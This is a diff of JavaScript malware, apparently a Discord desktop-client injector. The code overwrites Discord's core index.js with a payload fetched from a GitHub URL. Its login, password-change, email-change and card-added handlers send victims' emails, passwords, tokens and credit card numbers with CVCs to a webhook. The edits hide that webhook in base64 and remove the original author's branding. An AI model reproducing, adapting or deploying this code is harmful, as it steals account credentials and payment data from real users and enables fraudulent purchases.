@@ -4,20 +4,19 @@ const path = require('path');
 const https = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
+const encodedHook = '%WEBHOOKHEREBASE64ENCODED%'
 
 const config = {
-  webhook: '%WEBHOOK%', 
-  webhook_protector_key: '%WEBHOOK_KEY%', 
+  webhook: atob(encodedHook),
+  webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: false, 
   ping_on_run: true, 
-  ping_val: '@everyone',
+  ping_val: '@everyone', 
   embed_name: 'Real Lopez', 
-  embed_icon: 'https://raw.githubusercontent.com/reallopez/DiscordInjector/main/6690616208f98d35b6a66fb129793cf1.webp'.replace(/ /g, '%20'), 
-  embed_color: 2895667, 
+  embed_icon: 'https://raw.githubusercontent.com/reallopez/DiscordInjector/main/6690616208f98d35b6a66fb129793cf1.webp',
+  embed_color: 5639644, 
   injection_url: 'https://raw.githubusercontent.com/reallopez/DiscordInjector/main/index.js', 
-  /**
-   
-   **/
+
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
@@ -414,7 +413,8 @@ function updateCheck() {
   const appPath = path.join(resourcePath, 'app');
   const packageJson = path.join(appPath, 'package.json');
   const resourceIndex = path.join(appPath, 'index.js');
-  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
+  const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
+  const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
   const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
   if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
   if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
@@ -444,7 +444,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOK%', '${config.webhook}')
+        res.replace('%WEBHOOKHEREBASE64ENCODED%', '${encodedHook}')
         res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
@@ -494,21 +494,23 @@ const fetchBilling = async (token) => {
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
   if (!data) return '❌';
-  let billing = '';
+  const billing = [];
   data.forEach((x) => {
     if (!x.invalid) {
       switch (x.type) {
         case 1:
-          billing += '💳 ';
+          billing.push('💳');
           break;
         case 2:
-          billing += '<:paypal:951139189389410365> ';
+          billing.push('<:paypal:951139189389410365>');
           break;
+        default:
+            billing.push('(Unknown)');
       }
     }
   });
-  if (!billing) billing = '❌';
-  return billing;
+  if (billing.length == 0) billing.push('❌');
+  return billing.join(' ');
 };
 
 const Purchase = async (token, id, _type, _time) => {
@@ -571,54 +573,76 @@ const getNitro = (flags) => {
     case 1:
       return 'Nitro Classic';
     case 2:
-      return 'Nitro Boost';
+      return 'Nitro';
+    case 3:
+      return 'Nitro Basic';
     default:
-      return 'No Nitro';
+      return '(Unknown)';
   }
 };
 
 const getBadges = (flags) => {
-  let badges = '';
-  switch (flags) {
-    case 1:
-      badges += 'Discord Staff, ';
-      break;
-    case 2:
-      badges += 'Partnered Server Owner, ';
-      break;
-    case 131072:
-      badges += 'Verified Bot Developer, ';
-      break;
-    case 4:
-      badges += 'Hypesquad Event, ';
-      break;
-    case 16384:
-      badges += 'Gold BugHunter, ';
-      break;
-    case 8:
-      badges += 'Green BugHunter, ';
-      break;
-    case 512:
-      badges += 'Early Supporter, ';
-      break;
-    case 128:
-      badges += 'HypeSquad Brillance, ';
-      break;
-    case 64:
-      badges += 'HypeSquad Bravery, ';
-      break;
-    case 256:
-      badges += 'HypeSquad Balance, ';
-      break;
-    case 0:
-      badges = 'None';
-      break;
-    default:
-      badges = 'None';
-      break;
-  }
-  return badges;
-};
+    const badges = [];
+    
+    if (flags == 4194304) {
+        badges.push('Active Developer')
+        flags -= 4194304
+    }
+    if (flags == 262144) {
+        badges.push('Moderator Programs Alumni')
+        flags -= 262144
+    }
+    if (flags == 131072) {
+        badges.push('Early Verified Bot Developer')
+        flags -= 131072
+    }
+    if (flags == 16384) {
+        badges.push('Discord Bug Hunter (Golden)')
+        flags -= 16384
+    }
+    if (flags == 512) {
+        badges.push('Early Supporter')
+        flags -= 512
+    }
+    if (flags == 256) {
+        badges.push('HypeSquad Balance')
+        flags -= 256
+    }
+    if (flags == 128) {
+        badges.push('HypeSquad Brilliance')
+        flags -= 128
+    }
+    if (flags == 64) {
+        badges.push('HypeSquad Bravery')
+        flags -= 64
+    }
+    if (flags == 8) {
+        badges.push('Discord Bug Hunter (Normal)')
+        flags -= 8
+    }
+    if (flags == 4) {
+        badges.push('HypeSquad Event')
+        flags -= 4
+    }
+    if (flags == 2) {
+        badges.push('Partnered Server Owner')
+        flags -= 2
+    }
+    if (flags == 1) {
+        badges.push('Discord Staff')
+        flags -= 1
+    }
+    
+    if (flags == 0) {
+        if (badges.length == 0) {
+            badges.push('None')
+        }
+    } else {
+        badges.push('(Unknown)')
+    }
+    
+    return badges.join(', ');
+  };
 
 const hooker = async (content) => {
   const data = JSON.stringify(content);
@@ -676,11 +700,8 @@ const login = async (email, password, token) => {
           },
         ],
         author: {
-          name: 'Real Lopez'  + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://media.discordapp.net/attachments/1172720511525064816/1174175771787530290/6690616208f98d35b6a66fb129793cf1.webp`,
-        },
-        footer: {
-          text: 'Discord Injection By @real_lopez | https://t.me/real_lopez',
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
       },
     ],
@@ -718,11 +739,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           },
         ],
         author: {
-          name: 'Real Lopez'  + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://media.discordapp.net/attachments/1172720511525064816/1174175771787530290/6690616208f98d35b6a66fb129793cf1.webp`,
-        },
-        footer: {
-          text: 'Discord Injection By @real_lopez | https://t.me/real_lopez',
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
       },
     ],
@@ -760,11 +778,8 @@ const emailChanged = async (email, password, token) => {
           },
         ],
         author: {
-          name: 'Real Lopez'  + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://media.discordapp.net/attachments/1172720511525064816/1174175771787530290/6690616208f98d35b6a66fb129793cf1.webp`,
-        },
-        footer: {
-          text: 'Discord Injection By @real_lopez | https://t.me/real_lopez',
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
       },
     ],
@@ -786,7 +801,7 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Paypal Added**',
+            name: '**PayPal Added**',
             value: `Time to buy some nitro baby 😩`,
             inline: false,
           },
@@ -802,11 +817,8 @@ const PaypalAdded = async (token) => {
           },
         ],
         author: {
-          name: 'Real Lopez'  + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://media.discordapp.net/attachments/1172720511525064816/1174175771787530290/6690616208f98d35b6a66fb129793cf1.webp`,
-        },
-        footer: {
-          text: 'Discord Injection By @real_lopez | https://t.me/real_lopez',
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
       },
     ],
@@ -844,11 +856,8 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           },
         ],
         author: {
-          name: 'Real Lopez'  + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://media.discordapp.net/attachments/1172720511525064816/1174175771787530290/6690616208f98d35b6a66fb129793cf1.webp`,
-        },
-        footer: {
-          text: 'Discord Injection By @real_lopez | https://t.me/real_lopez',
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
       },
     ],
@@ -888,11 +897,8 @@ const nitroBought = async (token) => {
           },
         ],
         author: {
-          name: 'Real Lopez'  + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://media.discordapp.net/attachments/1172720511525064816/1174175771787530290/6690616208f98d35b6a66fb129793cf1.webp`,
-        },
-        footer: {
-          text: 'Discord Injection By @real_lopez | https://t.me/real_lopez',
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
       },
     ],
